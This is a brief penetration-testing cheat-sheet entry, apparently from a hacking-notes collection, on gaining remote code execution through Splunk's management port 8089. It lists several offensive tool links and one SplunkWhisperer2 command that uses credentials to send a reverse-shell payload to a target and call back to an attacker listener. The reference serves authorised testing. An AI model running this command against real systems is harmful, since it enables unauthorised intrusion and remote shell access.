# 8089 - Splunk

## RCE

{% code overflow="wrap" %}
```bash
https://book.hacktricks.xyz/network-services-pentesting/8089-splunkd
https://www.hackingarticles.in/penetration-testing-on-splunk/
https://github.com/TBGSecurity/splunk_shells/
https://github.com/cnotin/SplunkWhisperer2

# Against Linux target (remotely)
python PySplunkWhisperer2_remote.py --host 192.168.0.0 --lhost 192.168.0.1 --username user --password pass --payload "revshell"
```
{% endcode %}
